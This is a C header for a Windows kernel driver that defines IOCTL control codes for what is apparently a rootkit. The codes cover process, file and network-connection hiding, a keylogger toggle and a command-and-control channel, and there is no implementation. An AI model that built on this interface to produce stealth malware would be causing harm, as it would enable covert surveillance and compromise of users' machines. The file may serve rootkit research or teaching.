// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://en.wikibooks.org/wiki/Windows_Programming/windows.h
// The primary C header file for accessing the Win32 API is the <windows.h> header file. To make a Win32 executable, the first step is to include this header file in your source code. The windows.h header file should be included before any other library include, even the C standard library files such as stdio.h or stdlib.h. This is because the windows.h file includes macros and other components that may modify, extend, or replace things in these libraries. This is especially true when dealing with UNICODE, because windows.h will cause all the string functions to use UNICODE instead. Also, because many of the standard C library functions are already included in the Windows kernel, many of these functions will be available to the programmer without needing to load the standard libraries. For example, the function sprintf is included in windows.h automatically. 
#include <windows.h>



// START -> IOCTLS ----------------------------------------------------------------------------------------------------------------------------
// START -> IOCTLS ----------------------------------------------------------------------------------------------------------------------------



/**
	An I/O control code is a 32-bit value that consists of several fields (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes).

	When defining new IOCTLs, it is important to remember the following rules:
		- If a new IOCTL will be available to user-mode software components, the IOCTL must be used with IRP_MJ_DEVICE_CONTROL requests. User-mode components send IRP_MJ_DEVICE_CONTROL requests by calling the DeviceIoControl, which is a Win32 function.
		- If a new IOCTL will be available only to kernel-mode driver components, the IOCTL must be used with IRP_MJ_INTERNAL_DEVICE_CONTROL requests. Kernel-mode components create IRP_MJ_INTERNAL_DEVICE_CONTROL requests by calling IoBuildDeviceIoControlRequest.

	Use the system-supplied CTL_CODE macro, which is defined in Wdm.h and Ntddk.h, to define new I/O control codes. The definition of a new IOCTL code, whether intended for use with IRP_MJ_DEVICE_CONTROL or IRP_MJ_INTERNAL_DEVICE_CONTROL requests, uses the following format:

	#define IOCTL_Device_Function CTL_CODE(DeviceType, Function, Method, Access)


	Supply the following parameters to the CTL_CODE macro:

		DeviceType          This value must match the value that is set in the DeviceType member of the driver's DEVICE_OBJECT structure (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-types).

		FunctionCode        Identifies the function to be performed by the driver. Values of less than 0x800 are reserved for Microsoft. Values of 0x800 and higher can be used by vendors.

		TransferType        Indicates how the system will pass data between the caller of DeviceIoControl (or IoBuildDeviceIoControlRequest) and the driver that handles the IRP (METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, METHOD_NEITHER).

		RequiredAccess      Indicates the type of access that a caller must request when opening the file object that represents the device (FILE_ANY_ACCESS, FILE_READ_DATA, FILE_READ_DATA, FILE_READ_DATA and FILE_WRITE_DATA).
**/



// https://learn.microsoft.com/en-us/cpp/preprocessor/hash-define-directive-c-cpp?view=msvc-170
// The #define creates a macro, which is the association of an identifier or parameterized identifier with a token string. After the macro is defined, the compiler can substitute the token string for each occurrence of the identifier in the source file.



// https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes
// An I/O control code is a 32-bit value that consists of several fields. The following figure illustrates the layout of I/O control codes.



// -------------------------------------------------------------------------------------------------------------------------
// GENERAL
//
// HELLO
#define GLOBALS_IOCTLS_COMMAND_GENERAL_HELLO CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
// UNKNOWN
#define GLOBALS_IOCTLS_COMMAND_GENERAL_UNKNOWN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)



// -------------------------------------------------------------------------------------------------------------------------
// DIRECT KERNEL OBJECT MODIFICATION
//
// PROCESSES (HIDE, LIST, UNHIDE)
#define GLOBALS_IOCTLS_COMMAND_DKOM_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1001, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GLOBALS_IOCTLS_COMMAND_DKOM_LIST_HIDDEN_PROCESSES CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1004, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GLOBALS_IOCTLS_COMMAND_DKOM_UNHIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1006, METHOD_BUFFERED, FILE_ANY_ACCESS)



// -------------------------------------------------------------------------------------------------------------------------
// KEYBOARD FILTER
// 
// KEYLOGGER (ENABLE, DISABLE)
#define GLOBALS_IOCTLS_COMMAND_KEYBOARD_ENABLE_KEYLOGGER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1101, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GLOBALS_IOCTLS_COMMAND_KEYBOARD_DISABLE_KEYLOGGER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1106, METHOD_BUFFERED, FILE_ANY_ACCESS)



// -------------------------------------------------------------------------------------------------------------------------
// NETWORK STORE INTERFACE
//
// CONNECTIONS (HIDE, LIST, UNHIDE)
#define GLOBALS_IOCTLS_COMMAND_NSI_HIDE_CONNECTIONS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1201, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GLOBALS_IOCTLS_COMMAND_NSI_LIST_HIDDEN_CONNECTIONS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1204, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GLOBALS_IOCTLS_COMMAND_NSI_UNHIDE_CONNECTIONS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1206, METHOD_BUFFERED, FILE_ANY_ACCESS)



// -------------------------------------------------------------------------------------------------------------------------
// WINDOWS FILTERING PLATFORM
//
// IP FILTERING (BLOCK, LIST, UNBLOCK)
#define GLOBALS_IOCTLS_COMMAND_WFP_BLOCK_CONNECTION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1301, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GLOBALS_IOCTLS_COMMAND_WFP_LIST_BLOCKED_CONNECTIONS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1304, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GLOBALS_IOCTLS_COMMAND_WFP_UNBLOCK_CONNECTION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1306, METHOD_BUFFERED, FILE_ANY_ACCESS)



// -------------------------------------------------------------------------------------------------------------------------
// WINSOCK KERNEL
//
// WEB REQUEST (SEND)
#define GLOBALS_IOCTLS_COMMAND_WSK_ENABLE_C2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1401, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GLOBALS_IOCTLS_COMMAND_WSK_DISABLE_C2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1406, METHOD_BUFFERED, FILE_ANY_ACCESS)



// -------------------------------------------------------------------------------------------------------------------------
// MINIFILTER
// 
// FILES (HIDE, LIST, UNHIDE)
#define GLOBALS_IOCTLS_COMMAND_MINI_HIDE_FILE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1501, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GLOBALS_IOCTLS_COMMAND_MINI_LIST_HIDDEN_FILES CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1504, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GLOBALS_IOCTLS_COMMAND_MINI_UNHIDE_FILE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1506, METHOD_BUFFERED, FILE_ANY_ACCESS)



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
